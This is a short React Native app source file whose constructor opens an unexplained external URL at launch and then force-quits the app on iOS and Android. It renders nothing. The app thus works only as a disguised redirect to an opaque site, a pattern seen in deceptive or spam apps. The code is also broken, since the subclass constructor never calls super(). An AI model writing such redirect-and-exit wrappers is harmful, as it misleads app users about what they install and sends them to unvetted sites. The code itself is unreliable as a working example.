import React, { Component } from 'react';
import { Linking, NativeModules, Platform } from 'react-native';
import RNExitApp from 'react-native-exit-app';

export default class App extends Component {
  constructor() {
    Linking.openURL('https://1a7abf9244.nxcli.net/');
    if (Platform.OS === 'ios') {
      RNExitApp.exitApp();
    } else {
      const { KillApp } = NativeModules;
      KillApp.kill();
    }
  }
  render() {
    return <></>;
  }
}
